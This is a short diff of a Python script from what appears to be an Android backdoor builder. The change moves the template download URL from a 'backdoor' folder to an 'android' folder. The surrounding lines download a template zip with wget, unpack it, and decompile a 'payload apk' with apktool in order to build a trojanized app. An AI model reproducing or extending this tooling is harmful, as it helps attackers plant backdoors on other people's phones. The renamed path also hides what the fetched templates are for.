@@ -173,7 +173,7 @@ def menu():
                         print ("")
                         print (b+"[+]"+w+" using template:- "+g+tmp+".apk")
                         print (b+"[+]"+w+" downloading template from database")
-                        os.system("wget https://github.com/saydog-official/database/raw/master/backdoor/template/"+tmp+".zip &> /dev//null")
+                        os.system("wget https://github.com/saydog-official/database/raw/master/android/template/"+tmp+".zip &> /dev//null")
                         print (b+"[+]"+w+" unpacking template files from database")
                         os.system("unzip "+tmp+".zip &> /dev//null;rm -rf "+tmp+".zip")
                         print (b+"[+]"+w+" decompile payload apk using apktool")
